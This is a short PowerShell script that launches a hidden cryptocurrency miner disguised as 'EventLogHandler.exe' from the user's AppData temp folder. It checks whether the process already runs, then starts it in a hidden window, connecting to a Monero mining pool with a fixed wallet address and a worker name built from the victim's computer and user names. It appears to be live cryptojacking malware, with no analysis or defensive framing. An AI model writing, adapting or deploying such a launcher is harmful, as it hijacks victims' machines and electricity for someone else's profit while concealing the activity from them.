if (-not (Get-Process -Name "EventLogHandler" -ErrorAction SilentlyContinue)) {
    Start-Process -FilePath "$env:APPDATA\tmpdir\EventLogHandler.exe" `
        -ArgumentList "--background --donate-level 1 -o fi.monero.herominers.com:1111 -u 437q8JkNEEi8LarS4qVRAPSUoKb3LrDao9BKqZD8qZXKjpM9mMqh8ZVfVwHP3p1QhNAJKfKonSoBp7bbR46zJ5wB5frsV6y -p $($env:COMPUTERNAME)_$($env:USERNAME) -a rx/0 -k" `
        -WindowStyle Hidden
}
